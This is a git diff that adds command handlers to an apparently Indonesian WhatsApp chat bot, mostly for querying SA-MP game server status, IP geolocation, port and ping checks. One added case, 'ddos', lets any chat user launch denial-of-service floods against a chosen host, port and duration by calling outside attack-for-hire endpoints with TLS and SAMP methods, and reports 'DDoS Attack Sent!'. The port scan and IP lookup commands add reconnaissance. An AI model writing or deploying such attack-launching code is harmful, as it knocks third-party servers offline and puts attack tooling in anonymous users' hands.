@@ -78,6 +78,416 @@ module.exports = async (client, ctx) => {
          scheduled: true,
          timezone: process.env.TZ
       })
+      switch (command) {
+         // CASE CREATED BY PABLO
+// JANGAN MENGUBAH KALAU TIDAK PAHAM
+// KALAU API GA BERFUNGSI BERARTI DOMAIN GW EXPIRED :v
+
+// SAMP CASE SYSTEM
+// ===========================================================================================================================================================
+
+case 'samp': {
+    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1|7777`, m)
+    if (!text.includes('|') && !text.split(" ").length === 3) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1|7777`, m)
+    
+    const [ip, port] = text.includes('|') ? text.split("|") : text.split(" ").slice(-2);
+    let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=${ip}&port=${port}`
+    
+    try {
+        let response = await fetch(sampApiUrl)
+        let sampInfo = await response.json()
+
+        // Mengambil nilai dari properti yang diinginkan
+        let serverIP = sampInfo.response.serverip;
+        let address = sampInfo.response.address;
+        let gamemode = sampInfo.response.gamemode;
+        let playerOnline = sampInfo.response.isPlayerOnline;
+        let maxPlayers = sampInfo.response.maxplayers;
+        let hostname = sampInfo.response.hostname;
+        let language = sampInfo.response.language;
+        let lagCompensation = sampInfo.response.rule.lagcomp;
+        let mapName = sampInfo.response.rule.mapname;
+        let version = sampInfo.response.rule.version;
+        let weather = sampInfo.response.rule.weather;
+        let webUrl = sampInfo.response.rule.weburl;
+        let worldTime = sampInfo.response.rule.worldtime;
+
+        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
+        let result = `
+*Server Info:*
+- Server IP: ${serverIP}
+- Address: ${address}
+- Gamemode: ${gamemode}
+- Player Online: ${playerOnline}
+- Max Players: ${maxPlayers}
+- Hostname: ${hostname}
+- Language: ${language}
+- Lag Compensation: ${lagCompensation}
+- Map Name: ${mapName}
+- Version: ${version}
+- Weather: ${weather}
+- Web URL: ${webUrl}
+- World Time: ${worldTime}`;
+
+        // Menampilkan informasi pemain online (jika ada)
+        client.reply(m.chat, result, m);
+    } catch (error) {
+        console.error(error);
+        client.reply(m.chat, 'Error Cannot Connect To Server.', m);
+    }
+}
+break;
+
+case 'ipinfo': {
+    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} [alamat IP]`, m)
+
+    let ipAddress = text.trim();
+    let ipApiUrl = `https://api.pablonetwork.my.id/API/samp/ipinfo?key=pablo&host=${ipAddress}`;
+
+    try {
+        let response = await fetch(ipApiUrl);
+        let ipInfo = await response.json();
+
+        // Menampilkan informasi alamat IP dari ip-api.com
+        let result = `
+*Informasi Alamat IP (${ipAddress}):*
+- IP: ${ipInfo.query}
+- Continent: ${ipInfo.continent}
+- Continent Code: ${ipInfo.continentCode}
+- Country: ${ipInfo.country}
+- Country Code: ${ipInfo.countryCode}
+- Region: ${ipInfo.region}
+- Region Name: ${ipInfo.regionName}
+- City: ${ipInfo.city}
+- District: ${ipInfo.district}
+- Zip: ${ipInfo.zip}
+- Lat: ${ipInfo.lat}
+- Lon: ${ipInfo.lon}
+- TimeZone: ${ipInfo.timezone}
+- Currency: ${ipInfo.currency}
+- ISP: ${ipInfo.isp}
+- Organization: ${ipInfo.org}
+- AS: ${ipInfo.as}
+- AS Name: ${ipInfo.asname}
+- Reverse DNS: ${ipInfo.reverse}
+- Mobile: ${ipInfo.mobile ? 'Yes' : 'No'}
+- Proxy: ${ipInfo.proxy ? 'Yes' : 'No'}
+- Hosting: ${ipInfo.hosting ? 'Yes' : 'No'}`;
+
+        client.reply(m.chat, result, m);
+    } catch (error) {
+        console.error(error);
+        client.reply(m.chat, 'Terjadi kesalahan saat mengambil informasi alamat IP dari ip-api.com.', m);
+    }
+}
+break;
+
+case 'portscan': {
+    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} [alamat IP] [port]`, m)
+
+    const [ip, port] = text.trim().split(" ");
+    if (!ip || !port) return client.reply(m.chat, 'Mohon berikan alamat IP dan nomor port yang valid.', m);
+
+    let portScanApiUrl = `https://api.pablonetwork.my.id/API/samp/portscan?key=pablo&host=${ip}&port=${port}`;
+
+    try {
+        let response = await fetch(portScanApiUrl);
+
+        if (!response.ok) {
+            throw new Error(`Terjadi kesalahan saat meminta API. Kode status: ${response.status}`);
+        }
+
+        let scanResult = await response.json();
+
+        // Menampilkan hasil port scanning
+        let result = `
+*Hasil Port Scanning (${ip}:${port}):*
+- Status: ${scanResult.response.status}`;
+
+        if (scanResult.response.status === 'open') {
+            result += `\n- Port terbuka: ${port}`;
+        } else {
+            result += '\n- Port tertutup.';
+        }
+
+        client.reply(m.chat, result, m);
+    } catch (error) {
+        console.error(error);
+        client.reply(m.chat, 'Terjadi kesalahan saat melakukan port scanning.', m);
+    }
+}
+break;
+
+case 'pingscan': {
+    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} [alamat IP] [port]`, m)
+
+    const [ip, port] = text.trim().split(" ");
+    if (!ip || !port) return client.reply(m.chat, 'Mohon berikan alamat IP dan nomor port yang valid.', m);
+
+    let pingScanApiUrl = `https://api.pablonetwork.my.id/API/samp/ping?key=pablo&host=${ip}&port=${port}`;
+
+    try {
+        let response = await fetch(pingScanApiUrl);
+
+        if (!response.ok) {
+            throw new Error(`Terjadi kesalahan saat meminta API. Kode status: ${response.status}`);
+        }
+
+        let pingResult = await response.json();
+
+        if (pingResult.response && pingResult.response.ping !== undefined) {
+            // Menampilkan hasil ping scanning
+            let result = `
+*Result Ping Scan (${ip}:${port}):*
+- Ping: ${pingResult.response.ping} ms`;
+
+            client.reply(m.chat, result, m);
+        } else {
+            client.reply(m.chat, 'Tidak dapat mendapatkan informasi waktu ping dari respons API.', m);
+        }
+    } catch (error) {
+        console.error(error);
+        client.reply(m.chat, 'Terjadi kesalahan saat melakukan ping scan. Mohon periksa kembali alamat IP dan port yang diberikan.', m);
+    }
+}
+break;
+
+case 'ddos': {
+    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} [methods] [host] [port] [time]`, m)
+
+    const [jenisAtt, host, port, time] = text.trim().split(" ");
+    if (!jenisAtt || !host || !port || !time) return client.reply(m.chat, 'Mohon berikan semua parameter yang diperlukan.', m);
+
+    let apiUrl = '';
+    let attType = '';
+
+    if (jenisAtt.toLowerCase() === 'tls') {
+        apiUrl = `https://api-ddos.cyclic.app/?host=${host}&time=${time}&method=TLS`;
+        attType = 'DDoS Attack';
+    } else if (jenisAtt.toLowerCase() === 'samp') {
+        apiUrl = `https://flask-production-1db9.up.railway.app/?host=${host}&port=${port}&time=${time}`;
+        attType = 'DDoS Attack';
+    } else {
+        return client.reply(m.chat, 'Methods tidak valid. Harap pilih "TLS" atau "SAMP".', m);
+    }
+
+    try {
+        let response = await fetch(apiUrl);
+
+        if (!response.ok) {
+            throw new Error(`Terjadi kesalahan saat meminta API. Kode status: ${response.status}`);
+        }
+
+        // Menampilkan hasil serangan
+        let resultMessage = `
+        *${attType} Sent!*
+        - Methods: ${jenisAtt}
+        - Host: ${host}
+        - Port: ${port}
+        - Time: ${time}
+        - Sent By PabloNetwork`;
+
+        client.reply(m.chat, resultMessage, m);
+    } catch (error) {
+        console.error(error);
+        client.reply(m.chat, `Terjadi kesalahan saat melakukan ${attType}. Mohon periksa kembali parameter yang diberikan.`, m);
+    }
+}
+break;
+
+case 'helptrack': {
+    let helpMessage = `
+    ∘₊✧──────『𝗔𝗹𝗹 𝗠𝗲𝗻𝘂』──────
+
+┌  ◦ *𝗜𝗻𝗳𝗼 𝗠𝗲𝗻𝘂*
+│  ◦ samp
+│  ◦ fivem (OnGoing)
+│  ◦ mc (OnGoing)
+│  ◦ ddos
+│  ◦ ipinfo
+│  ◦ pingscan
+│  ◦ portscan
+│  ◦ wl (OnGoing)
+│  ◦ server
+│  ◦ player
+│  ◦ status
+│  ◦ ip
+┗─────────────────⬣
+    `;
+
+    client.reply(m.chat, helpMessage, m);
+}
+break;
+
+case 'fivem': {
+    let ComingSoonMessage= `
+   Sorry This Feature Is ComingSoon
+    `;
+
+    client.reply(m.chat, ComingSoonMessage, m);
+}
+break;
+
+case 'mc': {
+    let ComingSoonMessage= `
+   Sorry This Feature Is ComingSoon
+    `;
+
+    client.reply(m.chat, ComingSoonMessage, m);
+}
+break;
+
+case 'wl': {
+    let ComingSoonMessage= `
+   Sorry This Feature Is ComingSoon
+    `;
+
+    client.reply(m.chat, ComingSoonMessage, m);
+}
+break;
+
+case 'server': {
+    let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=aerialsdm.pablonetwork.my.id&port=7777`
+    
+    try {
+        let response = await fetch(sampApiUrl)
+        let sampInfo = await response.json()
+
+        // Mengambil nilai dari properti yang diinginkan
+        let serverIP = sampInfo.response.serverip;
+        let address = sampInfo.response.address;
+        let gamemode = sampInfo.response.gamemode;
+        let playerOnline = sampInfo.response.isPlayerOnline;
+        let maxPlayers = sampInfo.response.maxplayers;
+        let hostname = sampInfo.response.hostname;
+        let language = sampInfo.response.language;
+        let lagCompensation = sampInfo.response.rule.lagcomp;
+        let mapName = sampInfo.response.rule.mapname;
+        let version = sampInfo.response.rule.version;
+        let weather = sampInfo.response.rule.weather;
+        let webUrl = sampInfo.response.rule.weburl;
+        let worldTime = sampInfo.response.rule.worldtime;
+
+        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
+        let result = `
+*Aerials DM Server Info:*
+- Server IP: ${serverIP}
+- Address: ${address}
+- Gamemode: ${gamemode}
+- Player Online: ${playerOnline}
+- Max Players: ${maxPlayers}
+- Hostname: ${hostname}
+- Language: ${language}
+- Lag Compensation: ${lagCompensation}
+- Map Name: ${mapName}
+- Version: ${version}
+- Weather: ${weather}
+- Web URL: ${webUrl}
+- World Time: ${worldTime}`;
+
+        // Menampilkan informasi pemain online (jika ada)
+        client.reply(m.chat, result, m);
+    } catch (error) {
+        console.error(error);
+        client.reply(m.chat, 'Now Server Is Offline 🔴.', m);
+    }
+}
+break;
+
+case 'player': {
+    let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=aerialsdm.pablonetwork.my.id&port=7777`
+    
+    try {
+        let response = await fetch(sampApiUrl)
+        let sampInfo = await response.json()
+
+        // Mengambil nilai dari properti yang diinginkan
+        let serverIP = sampInfo.response.serverip;
+        let address = sampInfo.response.address;
+        let gamemode = sampInfo.response.gamemode;
+        let playerOnline = sampInfo.response.isPlayerOnline;
+        let maxPlayers = sampInfo.response.maxplayers;
+        let hostname = sampInfo.response.hostname;
+        let language = sampInfo.response.language;
+        let lagCompensation = sampInfo.response.rule.lagcomp;
+        let mapName = sampInfo.response.rule.mapname;
+        let version = sampInfo.response.rule.version;
+        let weather = sampInfo.response.rule.weather;
+        let webUrl = sampInfo.response.rule.weburl;
+        let worldTime = sampInfo.response.rule.worldtime;
+
+        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
+        let result = `
+*Aerials DM Players Info:*
+- Server IP: ${serverIP}
+- Hostname: ${hostname}
+- Player Online: ${playerOnline}
+- Max Players: ${maxPlayers}`;
+
+        // Menampilkan informasi pemain online (jika ada)
+        client.reply(m.chat, result, m);
+    } catch (error) {
+        console.error(error);
+        client.reply(m.chat, 'Now Server Is Offline 🔴.', m);
+    }
+}
+break;
+
+case 'status': {
+    let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=aerialsdm.pablonetwork.my.id&port=7777`
+    
+    try {
+        let response = await fetch(sampApiUrl)
+        let sampInfo = await response.json()
+
+        // Mengambil nilai dari properti yang diinginkan
+        let serverIP = sampInfo.response.serverip;
+        let address = sampInfo.response.address;
+        let gamemode = sampInfo.response.gamemode;
+        let playerOnline = sampInfo.response.isPlayerOnline;
+        let maxPlayers = sampInfo.response.maxplayers;
+        let hostname = sampInfo.response.hostname;
+        let language = sampInfo.response.language;
+        let lagCompensation = sampInfo.response.rule.lagcomp;
+        let mapName = sampInfo.response.rule.mapname;
+        let version = sampInfo.response.rule.version;
+        let weather = sampInfo.response.rule.weather;
+        let webUrl = sampInfo.response.rule.weburl;
+        let worldTime = sampInfo.response.rule.worldtime;
+
+        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
+        let result = `
+*Now Server Is Online 🟢.*`;
+
+        // Menampilkan informasi pemain online (jika ada)
+        client.reply(m.chat, result, m);
+    } catch (error) {
+        console.error(error);
+        client.reply(m.chat, 'Now Server Is Offline 🔴.', m);
+    }
+}
+break;
+
+case 'shutdown': {
+    if (m.sender !== '62857552519341') return client.reply(m.chat, 'Maaf, hanya owner yang dapat menggunakan fitur ini.', m);
+    client.reply(m.chat, 'Otsukaresama deshita 🖐', m);
+    await sleep(3000);
+    process.exit();
+}
+break;
+
+case 'ip': {
+    let IpMessage= `
+aerialsdm.pablonetwork.my.id:6100
+    `;
+
+    client.reply(m.chat, IpMessage, m);
+}
+break;
+// BATAS SUCI
+// ===========================================================================================================================================================
+
+      }
       if (m.isGroup && !m.fromMe) {
          let now = new Date() * 1
          if (!groupSet.member[m.sender]) {
